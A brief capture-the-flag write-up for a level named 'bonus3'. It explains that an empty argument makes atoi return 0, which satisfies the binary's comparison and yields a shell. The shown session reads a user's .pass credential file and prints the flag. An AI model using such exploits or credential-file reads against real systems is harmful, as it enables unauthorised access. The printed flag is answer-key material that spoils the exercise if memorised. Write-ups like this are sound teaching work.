# This is the end (bonus3)

So this [binary](source.c) is fairly simple. It takes precisely one argument
turns it into an integer with [atoi](https://linux.die.net/man/3/atoi). It sets
a buffer's null byte at the an index equal to the value returned by the atoi
call. Then it compares the resulting string to the argument. If they are equal,
we get a shell.

Since atoi returns 0 by default if the input string is not a valid integer, all
we have to do is this:

```shell
./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

That's all folks!
